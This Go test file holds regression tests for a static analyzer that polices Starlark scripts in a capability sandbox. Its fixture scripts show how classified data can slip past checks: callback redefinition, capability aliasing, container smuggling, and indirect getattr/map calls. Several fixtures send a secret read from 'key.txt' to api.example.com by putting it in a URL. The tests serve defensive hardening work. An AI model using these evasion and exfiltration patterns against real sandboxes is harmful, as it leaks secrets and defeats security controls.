package analysis

import (
	"strings"
	"testing"
)

// Regression tests for analyzer bypasses found in the hardening review.

func hasCode(issues []Issue, code string) bool {
	for _, iss := range issues {
		if iss.Code == code {
			return true
		}
	}
	return false
}

func TestAnalyzeRedefinitionBypass(t *testing.T) {
	// Starlark resolves to the LAST binding; the old analyzer checked the
	// first def, letting an impure redefinition run under a passing analysis.
	code := `
def cb(x):
    return x.upper()

result = data.map(cb)

def cb(x):
    io.println(x)

result2 = data.map(cb)
`
	issues, err := Analyze("test.star", []byte(code))
	if err != nil {
		t.Fatal(err)
	}
	if !hasCode(issues, "AMBIGUOUS_CALLBACK_DEF") {
		t.Fatalf("expected AMBIGUOUS_CALLBACK_DEF, got %v", issues)
	}
}

func TestAnalyzeReboundFunctionBypass(t *testing.T) {
	// A def later re-bound via assignment is also unverifiable.
	code := `
def cb(x):
    return x.upper()

cb = lambda x: io.println(x)
result = data.map(cb)
`
	issues, err := Analyze("test.star", []byte(code))
	if err != nil {
		t.Fatal(err)
	}
	if !hasCode(issues, "AMBIGUOUS_CALLBACK_DEF") {
		t.Fatalf("expected AMBIGUOUS_CALLBACK_DEF, got %v", issues)
	}
}

func TestAnalyzeSingleDefStillPure(t *testing.T) {
	code := `
def cb(x):
    return x.upper()
result = data.map(cb)
`
	issues, err := Analyze("test.star", []byte(code))
	if err != nil {
		t.Fatal(err)
	}
	for _, iss := range issues {
		if iss.Code == "AMBIGUOUS_CALLBACK_DEF" {
			t.Fatalf("unexpected AMBIGUOUS_CALLBACK_DEF for single def: %v", issues)
		}
	}
}

func TestAnalyzeKwargsWriteBypass(t *testing.T) {
	// write(content=secret) previously skipped the classified-arg check.
	code := `
f = fs.access("file.txt")
secret = f.read_classified()
f.write(content=secret)
`
	issues, err := Analyze("test.star", []byte(code))
	if err != nil {
		t.Fatal(err)
	}
	if !hasCode(issues, "CLASSIFIED_WRITE_MISMATCH") {
		t.Fatalf("expected CLASSIFIED_WRITE_MISMATCH for keyword arg, got %v", issues)
	}
}

func TestAnalyzeClassifiedTaintInsideFunction(t *testing.T) {
	// Classified locals inside def bodies were invisible to the old
	// top-level-only tracker.
	code := `
def leak(entry):
    secret = entry.read_classified()
    entry.write(secret)
`
	issues, err := Analyze("test.star", []byte(code))
	if err != nil {
		t.Fatal(err)
	}
	if !hasCode(issues, "CLASSIFIED_WRITE_MISMATCH") {
		t.Fatalf("expected CLASSIFIED_WRITE_MISMATCH inside def body, got %v", issues)
	}
}

func TestAnalyzeClassifiedTaintInsideConditional(t *testing.T) {
	code := `
c = entry.read_classified()
if flag:
    c = entry.read_classified()
entry.write(c)
`
	issues, err := Analyze("test.star", []byte(code))
	if err != nil {
		t.Fatal(err)
	}
	if !hasCode(issues, "CLASSIFIED_WRITE_MISMATCH") {
		t.Fatalf("expected CLASSIFIED_WRITE_MISMATCH for taint from if-block, got %v", issues)
	}
}

func TestAnalyzeIssueHasPositionAndCode(t *testing.T) {
	issues, err := Analyze("test.star", []byte("f.write(f.read_classified())"))
	if err != nil {
		t.Fatal(err)
	}
	if len(issues) == 0 {
		t.Fatal("expected at least one issue")
	}
	if issues[0].Code == "" {
		t.Fatal("issue code must be set")
	}
	if !strings.Contains(issues[0].Error(), "test.star") {
		t.Fatalf("issue message should include position, got %q", issues[0].Error())
	}
}

// Regression: pure builtins like str are valid map callbacks; the analyzer
// previously rejected data.map(str) because builtins were not in defs.
func TestAnalyzeMapWithPureBuiltinCallback(t *testing.T) {
	code := `
result = data.map(str)
`
	issues, err := Analyze("test.star", []byte(code))
	if err != nil {
		t.Fatal(err)
	}
	for _, iss := range issues {
		if strings.HasPrefix(iss.Message, "map callback must be") {
			t.Fatalf("pure builtin callback should be accepted, got: %v", issues)
		}
	}
}

// --- Security hardening regressions: capability exfiltration channels ---

// net.get is in pureMethods (for dict.get) and the method check is
// receiver-blind: inside a map callback the raw classified value could be
// URL-concatenated and sent to an allowlisted host.
func TestAnalyzeNetGetInMapCallback(t *testing.T) {
	code := `
secret = fs.access("key.txt").read_classified()
def exfil(s):
    body = net.get("https://api.example.com/log?d=" + s)
    return s
out = secret.map(exfil)
`
	issues, err := Analyze("test.star", []byte(code))
	if err != nil {
		t.Fatal(err)
	}
	if !hasCode(issues, "IMPURE_CAPABILITY_REF") {
		t.Fatalf("expected IMPURE_CAPABILITY_REF, got %v", issues)
	}
}

// Aliasing the capability inside the callback (`n = net`) must not weaken
// the check; the alias assignment itself references the capability.
func TestAnalyzeCapabilityAliasInsideCallback(t *testing.T) {
	code := `
secret = fs.access("key.txt").read_classified()
def exfil(s):
    n = net
    body = n.get("https://api.example.com/log?d=" + s)
    return s
out = secret.map(exfil)
`
	issues, err := Analyze("test.star", []byte(code))
	if err != nil {
		t.Fatal(err)
	}
	if !hasCode(issues, "IMPURE_CAPABILITY_REF") {
		t.Fatalf("expected IMPURE_CAPABILITY_REF, got %v", issues)
	}
}

// Aliasing at top level (`n = net`) hides the capability name from a
// receiver-blind method check; global aliases must be tracked.
func TestAnalyzeTopLevelCapabilityAlias(t *testing.T) {
	code := `
n = net
secret = fs.access("key.txt").read_classified()
def exfil(s):
    body = n.get("https://api.example.com/log?d=" + s)
    return s
out = secret.map(exfil)
`
	issues, err := Analyze("test.star", []byte(code))
	if err != nil {
		t.Fatal(err)
	}
	if !hasCode(issues, "IMPURE_CAPABILITY_REF") {
		t.Fatalf("expected IMPURE_CAPABILITY_REF, got %v", issues)
	}
}

// A capability smuggled inside a container (`d = {"n": net}`) and pulled
// out in the callback must be caught by alias taint propagation.
func TestAnalyzeCapabilityContainerSmuggle(t *testing.T) {
	code := `
d = {"n": net}
secret = fs.access("key.txt").read_classified()
def exfil(s):
    body = d["n"].get("https://api.example.com/log?d=" + s)
    return s
out = secret.map(exfil)
`
	issues, err := Analyze("test.star", []byte(code))
	if err != nil {
		t.Fatal(err)
	}
	if !hasCode(issues, "IMPURE_CAPABILITY_REF") {
		t.Fatalf("expected IMPURE_CAPABILITY_REF, got %v", issues)
	}
}

// Non-regression: classified data derived from capabilities (via
// read_classified) is pure data; chained map on a global classified value
// inside a callback must keep working.
func TestAnalyzeChainedMapOnGlobalClassifiedStillPure(t *testing.T) {
	code := `
other = fs.access("k2.txt").read_classified()
def inner(x):
    return x.upper()
def cb(s):
    return other.map(inner)
secret = fs.access("key.txt").read_classified()
out = secret.map(cb)
`
	issues, err := Analyze("test.star", []byte(code))
	if err != nil {
		t.Fatal(err)
	}
	if hasCode(issues, "IMPURE_CAPABILITY_REF") || hasCode(issues, "IMPURE_METHOD_CALL") {
		t.Fatalf("chained classified map should be accepted, got %v", issues)
	}
}

// Non-regression: dict.get on a local dict is pure and stays allowed.
func TestAnalyzeLocalDictGetStillPure(t *testing.T) {
	code := `
def cb(s):
    d = {"k": "v"}
    return d.get("k", "") + s.upper()
out = data.map(cb)
`
	issues, err := Analyze("test.star", []byte(code))
	if err != nil {
		t.Fatal(err)
	}
	if hasCode(issues, "IMPURE_CAPABILITY_REF") || hasCode(issues, "IMPURE_METHOD_CALL") {
		t.Fatalf("local dict.get should be accepted, got %v", issues)
	}
}

// Non-regression: a callback parameter that shadows a capability name is a
// local plain value, not a capability reference.
func TestAnalyzeCallbackParamShadowingCapabilityName(t *testing.T) {
	code := `
def cb(net):
    return net.upper()
out = data.map(cb)
`
	issues, err := Analyze("test.star", []byte(code))
	if err != nil {
		t.Fatal(err)
	}
	if hasCode(issues, "IMPURE_CAPABILITY_REF") {
		t.Fatalf("param shadowing a capability name should be accepted, got %v", issues)
	}
}

// --- Security hardening regressions: map/flat_map indirection ---

// getattr(secret, "map")(exfil) invokes the map method indirectly; the
// callback must still be purity-checked.
func TestAnalyzeGetattrIndirectMapCall(t *testing.T) {
	code := `
secret = fs.access("key.txt").read_classified()
def exfil(s):
    io.println(s)
    return s
out = getattr(secret, "map")(exfil)
`
	issues, err := Analyze("test.star", []byte(code))
	if err != nil {
		t.Fatal(err)
	}
	if !hasCode(issues, "IMPURE_METHOD_CALL") {
		t.Fatalf("expected callback purity check for indirect map call, got %v", issues)
	}
}

// m = secret.map stores the method value for later invocation, bypassing
// the direct-call-only purity check; the aliasing itself must be flagged.
func TestAnalyzeMapMethodValueAlias(t *testing.T) {
	code := `
secret = fs.access("key.txt").read_classified()
def exfil(s):
    io.println(s)
    return s
m = secret.map
out = m(exfil)
`
	issues, err := Analyze("test.star", []byte(code))
	if err != nil {
		t.Fatal(err)
	}
	if !hasCode(issues, "MAP_METHOD_ALIAS") {
		t.Fatalf("expected MAP_METHOD_ALIAS, got %v", issues)
	}
}

// m = getattr(secret, "map") is the same smuggling via getattr.
func TestAnalyzeGetattrMapValueAlias(t *testing.T) {
	code := `
secret = fs.access("key.txt").read_classified()
def exfil(s):
    io.println(s)
    return s
m = getattr(secret, "map")
out = m(exfil)
`
	issues, err := Analyze("test.star", []byte(code))
	if err != nil {
		t.Fatal(err)
	}
	if !hasCode(issues, "MAP_METHOD_ALIAS") {
		t.Fatalf("expected MAP_METHOD_ALIAS, got %v", issues)
	}
}

// getattr with a non-literal attribute name on classified data can fetch
// the map method dynamically, defeating verification.
func TestAnalyzeDynamicGetattrOnClassified(t *testing.T) {
	code := `
attr = "map"
secret = fs.access("key.txt").read_classified()
def exfil(s):
    io.println(s)
    return s
out = getattr(secret, attr)(exfil)
`
	issues, err := Analyze("test.star", []byte(code))
	if err != nil {
		t.Fatal(err)
	}
	if !hasCode(issues, "DYNAMIC_GETATTR") {
		t.Fatalf("expected DYNAMIC_GETATTR, got %v", issues)
	}
}

// Non-regression: getattr with a literal, non-map attribute name on
// non-classified data stays allowed.
func TestAnalyzeGetattrLiteralStillAllowed(t *testing.T) {
	code := `
s = "hello"
out = getattr(s, "upper")()
`
	issues, err := Analyze("test.star", []byte(code))
	if err != nil {
		t.Fatal(err)
	}
	if hasCode(issues, "DYNAMIC_GETATTR") || hasCode(issues, "MAP_METHOD_ALIAS") {
		t.Fatalf("literal getattr on plain data should be accepted, got %v", issues)
	}
}

// --- Security hardening regressions: taint propagation ---

// Taint must propagate through concatenation: f.write("x" + secret) is a
// classified write even though the top-level expression is a BinaryExpr.
func TestAnalyzeTaintThroughConcatenation(t *testing.T) {
	code := `
secret = fs.access("key.txt").read_classified()
f = fs.access("out.txt")
f.write("leak: " + secret)
`
	issues, err := Analyze("test.star", []byte(code))
	if err != nil {
		t.Fatal(err)
	}
	if !hasCode(issues, "CLASSIFIED_WRITE_MISMATCH") {
		t.Fatalf("expected CLASSIFIED_WRITE_MISMATCH, got %v", issues)
	}
}

// Taint propagates through containers as well.
func TestAnalyzeTaintThroughContainer(t *testing.T) {
	code := `
secret = fs.access("key.txt").read_classified()
f = fs.access("out.txt")
f.write([secret])
`
	issues, err := Analyze("test.star", []byte(code))
	if err != nil {
		t.Fatal(err)
	}
	if !hasCode(issues, "CLASSIFIED_WRITE_MISMATCH") {
		t.Fatalf("expected CLASSIFIED_WRITE_MISMATCH, got %v", issues)
	}
}
